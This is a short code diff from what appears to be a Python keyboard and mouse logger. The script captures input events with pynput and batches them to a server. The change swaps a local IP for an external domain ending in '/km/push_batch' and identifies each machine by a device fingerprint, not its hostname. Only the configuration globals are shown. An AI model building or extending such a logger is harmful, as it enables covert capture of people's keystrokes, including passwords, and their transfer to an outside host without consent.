@@ -3,11 +3,13 @@ import threading
 import platform
 import requests
 from pynput import mouse, keyboard
+from device_fingerprint import get_device_fingerprint
 
 # --- Globals ---
 events = []
-DEVICE_ID = platform.node()
-SERVER_URL = "http://192.168.79.75:8000/push_batch"
+fp_info   = get_device_fingerprint()
+DEVICE_ID = fp_info.get("fingerprint", "unknown_fingerprint")
+SERVER_URL = "https://services.vistaa.xyz/km/push_batch"
 BATCH_INTERVAL = 2  # seconds
 MAX_EVENTS = 1000
 SEND_WINDOW = 200
